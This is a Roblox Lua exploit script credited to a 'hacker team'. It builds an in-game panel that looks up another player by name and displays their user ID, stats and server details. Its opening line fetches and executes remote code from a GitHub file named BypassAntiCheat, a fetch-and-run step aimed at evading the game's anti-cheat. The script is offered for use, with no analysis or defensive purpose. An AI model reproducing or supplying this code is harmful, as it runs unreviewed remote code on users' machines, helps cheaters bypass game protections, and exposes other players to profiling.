print("Made by Triackers Hacker Team")
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/main/main.lua'))()
wait(2)
local plr = game.Players.LocalPlayer
local screenui = Instance.new("ScreenGui")

screenui.Parent = plr.PlayerGui
screenui.Name = "Triackers_PLRSTATS"
screenui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Parent = screenui
frame.Size = UDim2.new(0.255, 0,0.701, 0)
frame.Position = UDim2.new(0.73, -228,0.332, -140)
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.Active = true
frame.Draggable = true

local uicorner = Instance.new("UICorner")
uicorner.Parent = frame
uicorner.CornerRadius = UDim.new(0, 25)

local uistroke = Instance.new("UIStroke")
uistroke.Parent = frame
uistroke.Color = Color3.fromRGB(0, 85, 0)
uistroke.Thickness = 5

local textlabel = Instance.new("TextLabel")
textlabel.Parent = frame
textlabel.Font = Enum.Font.Merriweather
textlabel.TextScaled = true
textlabel.Text = "Player Data"
textlabel.TextColor3 = Color3.fromRGB(0, 85, 0)
textlabel.Size = UDim2.new(0.938, 0,0.066, 0)
textlabel.BackgroundTransparency = 1
textlabel.Position = UDim2.new(0.029, 0,-0.001, 0)

local boa = Instance.new("TextLabel")
boa.Visible = true
boa.Parent = frame
boa.Font = Enum.Font.Merriweather
boa.TextScaled = true
boa.Text = "You have to first write the name of the Player to get the Data"
boa.TextColor3 = Color3.fromRGB(85, 0, 0)
boa.Size = UDim2.new(0.938, 0,0.492, 0)
boa.BackgroundTransparency = 1
boa.Position = UDim2.new(0.029, 0,0.358, 0)

local TextBox = Instance.new("TextBox")
TextBox.Parent = frame
TextBox.Size = UDim2.new(0.869, 0,0.099, 0)
TextBox.TextScaled = true
TextBox.Text = ""
TextBox.PlaceholderText = "Players Username that you wanna get the data"
TextBox.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox.TextColor3 = Color3.fromRGB(0, 85, 0)
TextBox.Position = UDim2.new(0.06, 0,0.083, 0)

local uicorner3 = Instance.new("UICorner")
uicorner3.Parent = TextBox
uicorner3.CornerRadius = UDim.new(0, 25)

local uistroke3 = Instance.new("UIStroke")
uistroke3.Parent = TextBox
uistroke3.Color = Color3.fromRGB(0, 85, 0)
uistroke3.Thickness = 2
uistroke3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local GetButton = Instance.new("TextButton")
GetButton.Parent = frame
GetButton.Size = UDim2.new(0.588, 0,0.079, 0)
GetButton.TextScaled = true
GetButton.Text = "Get Data"
GetButton.BackgroundColor3 = Color3.new(0, 0, 0)
GetButton.TextColor3 = Color3.fromRGB(0, 85, 0)
GetButton.Position = UDim2.new(0.198, 0,0.211, 0)

local uicorner2 = Instance.new("UICorner")
uicorner2.Parent = GetButton
uicorner2.CornerRadius = UDim.new(0, 25)

local uistroke2 = Instance.new("UIStroke")
uistroke2.Parent = GetButton
uistroke2.Color = Color3.fromRGB(0, 85, 0)
uistroke2.Thickness = 2
uistroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local DataBox = Instance.new("TextBox")
DataBox.Visible = false
DataBox.Parent = frame
DataBox.Size = UDim2.new(0.869, 0,0.541, 0)
DataBox.TextScaled = true
DataBox.Text = ""
DataBox.PlaceholderText = ""
DataBox.BackgroundColor3 = Color3.new(0, 0, 0)
DataBox.TextColor3 = Color3.fromRGB(0, 85, 0)
DataBox.Position = UDim2.new(0.064, 0,0.358, 0)

local uicorner3 = Instance.new("UICorner")
uicorner3.Parent = DataBox
uicorner3.CornerRadius = UDim.new(0, 25)

local uistroke3 = Instance.new("UIStroke")
uistroke3.Parent = DataBox
uistroke3.Color = Color3.fromRGB(0, 85, 0)
uistroke3.Thickness = 2
uistroke3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local x = Instance.new("TextButton")
x.Parent = frame
x.Size = UDim2.new(0.121, 0,0.075, 0)
x.TextScaled = true
x.Text = "x"
x.BackgroundColor3 = Color3.new(0, 0, 0)
x.TextColor3 = Color3.fromRGB(255, 0, 0)
x.Position = UDim2.new(0.926, 0,0.96, 0)

local uicorner7 = Instance.new("UICorner")
uicorner7.Parent = x
uicorner7.CornerRadius = UDim.new(0, 25)

local uistroke7 = Instance.new("UIStroke")
uistroke7.Parent = x
uistroke7.Color = Color3.fromRGB(255, 0, 0)
uistroke7.Thickness = 2
uistroke7.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local Players = game:GetService("Players")
local a

local function printPlayerData(player)
	local b = plr.Name
	local serverId = game.JobId
	local playerCount = #Players:GetPlayers()
	a = '[username: '..player.Name..'], '
	a = a..'[user-id: '..player.UserId..'], '

	local leaderstats = player:FindFirstChild("leaderstats")
	if leaderstats then
		for _, stat in leaderstats:GetChildren() do
			a = a..'['..stat.Name..': '.. stat.Value..'], '
		end
	end

	-- Print other values in the player
	for _, child in player:GetChildren() do
		if child:IsA("ValueBase") then
			a = a..'['..child.Name..': '.. child.Value..'], '
		end
	end
	a = a..'[game-id: '..game.GameId..'], '
	a = a..'[game-name: '..game.Name..'], '
	a = a..'[server-id: '..serverId..'], '
	a = a..'[players-in-server: '..playerCount..'], '
	repeat
		DataBox.Text = a
		wait(0.05)
	until not (TextBox.Text == b)
	boa.Visible = true
	DataBox.Visible = false
end

GetButton.MouseButton1Click:Connect(function()
	if game.Players:FindFirstChild(TextBox.Text) then
		boa.Visible = false
		DataBox.Visible = true
		printPlayerData(game.Players[TextBox.Text])
	end
end)

x.MouseButton1Click:Connect(function()
	screenui:Destroy()
end)
